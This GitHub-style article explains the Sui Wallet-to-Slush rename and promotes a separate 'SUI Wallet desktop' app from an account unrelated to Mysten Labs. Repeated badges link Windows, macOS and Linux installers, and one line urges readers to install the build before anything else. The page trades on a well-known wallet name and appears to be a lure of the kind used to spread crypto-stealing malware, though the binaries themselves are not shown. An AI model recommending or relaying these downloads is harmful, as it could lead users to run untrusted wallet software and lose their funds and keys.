![SUI Wallet](assets/banner-article.png)

# What happened to Sui Wallet, and what Slush is

Two products have carried the name, and only one of them is this one.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

The Mysten Labs browser wallet named Sui Wallet merged with Stashed and became **Slush** in April 2025, so
a search for the old name now finds Slush. The desktop application in these guides is its own product on
its own [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest). A reader who wants a desktop wallet is in the right place; one who wants the
extension is not.

## What happened, in order

The name is older than the product in front of you, and that is the source of the confusion. Sui Wallet
was the name of a browser extension published by Mysten Labs. Stashed was a separate product from the same
publisher. The two were merged, and the merged product took the name Slush in April 2025.

Nothing in that history describes this desktop application, which was never the extension and never
carried the merged name. Two products, two publishers, two release channels - and a shared word in the
title that search engines treat as evidence of sameness.

## Which product the search term returns

Search for Sui Wallet today and the results describe Slush: extension listings, mobile apps, pages about
signing in with a provider. That is correct behaviour for the query and the wrong product for a reader
who wants a desktop wallet.

This matters because a reader following a guide written for one product and installed with the other gets
a first run that does not match the screenshots. The usual conclusion is that the guide is wrong. Usually
the guide is fine and the product is different.

## The difference between the two

| | This desktop wallet | The browser wallet now called Slush |
| --- | --- | --- |
| Shape | Installed desktop application | Browser extension and mobile apps |
| Where the keys live | On your machine | In the extension or app |
| Published by | This project's [GitHub account](https://github.com/sui-blockchain-wallet/sui-wallet-desktop) | Mysten Labs |
| Release channel | A GitHub release with three platform files | Browser and app stores |

The table is not a comparison of quality; it is a description of two different things that share a name in
search results. [Choosing the best Sui wallet for desktop](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/choosing-the-best-sui-wallet-for-desktop.md) covers how to weigh them, including
the case where an extension is the right answer for what a reader actually wants to do.

## Why the desktop app is a separate download

The Sui ecosystem's own desktop story has been a browser extension plus mobile apps, so a reader who
assumes "Sui wallet" means an extension is making a reasonable inference from the market. A native desktop
application is a different bet: a window of its own, a hardware wallet plugged into a port, and no browser
profile in the middle.

That difference is why this product is not on a store listing. Its release page is the only distribution
channel, and the file is the same three-platform release every time - which is also the check that tells
the two products apart at the download stage.

## How to tell which one is installed

Three quick checks, and each one answers the question on its own, so a reader who is unsure can stop at
the first that fits. Together they also explain the confusion: the two products are easy to tell apart
once you know what to look for.

- **Where it lives.** An extension sits inside a browser's extension list. This product sits in
  Applications, in Program Files, or in a folder you unpacked.
- **How it opens.** The extension opens from a toolbar button; the desktop app has its own window and its
  own entry in the application menu.
- **What the about or diagnostics panel says.** The desktop app's diagnostics panel names a version, a
  network and the last transaction digest.

If all three point at an extension, the reader has Slush installed, and no amount of reinstalling will
turn it into a desktop app.

[What is SUI Wallet for desktop?](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/what-is-sui-wallet-desktop.md) describes what the desktop product does, and
[verify you have the official SUI Wallet](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/how-to-verify-the-official-sui-wallet.md) covers how to check the provenance of whichever build
you end up with.

## What did not change

Three things stayed the same through the rename, and they are the ones a worried reader asks about. A seed
phrase is still the account: whoever holds the words holds the funds. A phrase from one product does not
open the other's accounts. And no support channel needs your words.

That last point is the practical one on this page. A reader arriving from a search about the old name is a
prime target for a page that offers to "migrate" or "recover" an account and asks for the 24 words first.
No migration needs them, and this product has no migration to offer.

## FAQ

### Did Sui Wallet change to Slush?

The Mysten Labs browser wallet of that name did, in April 2025, when it merged with Stashed. This desktop
application did not: it is a separate product with a separate release page.

### Is every Sui wallet a browser extension?

No. The ecosystem's dominant shape has been an extension plus mobile apps, but a native desktop
application exists and is what these guides cover.

### Can I use my old phrase in both?

A phrase opens the accounts its own product derives. Typing a phrase from one product into the other is
how readers end up staring at an empty wallet, so keep each phrase with the product that made it.

### Is Slush a cold wallet?

No. It is software that runs in a browser or on a phone, which means the keys live on a networked device.
A desktop app with a hardware wallet attached is a different arrangement.

### How do I know which one I have?

Look at where it lives and how it opens. An entry in a browser's extension list is the extension; an
installed application with its own window and its own diagnostics panel is the desktop app.

### Do I need to migrate anything?

Not to use the desktop application. Install it, create an account or restore one from its own phrase, and
treat any page offering a migration service with the suspicion such pages deserve.
